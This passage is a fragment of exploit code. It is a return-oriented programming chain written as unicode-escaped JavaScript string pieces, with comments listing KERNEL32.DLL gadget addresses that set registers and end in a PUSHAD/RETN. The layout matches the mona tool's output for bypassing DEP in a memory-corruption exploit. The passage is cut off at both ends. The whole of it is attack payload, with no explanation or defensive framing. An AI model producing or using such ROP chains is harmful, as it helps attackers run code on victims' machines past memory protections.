    "%uad7a%u75c3" + // 0x75c3ad7a : ,# XCHG EAX,ECX # ADD AL,BYTE PTR DS:[EAX] # POP EBP # RETN 0x04 [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%ubafc%u75c6" + // 0x75c6bafc : ,# POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u5383%u75c3" + // 0x75c35383 : ,# RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u51e7%u75c6" + // 0x75c651e7 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u6095%u75c3" + // 0x75c36095 : ,# PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

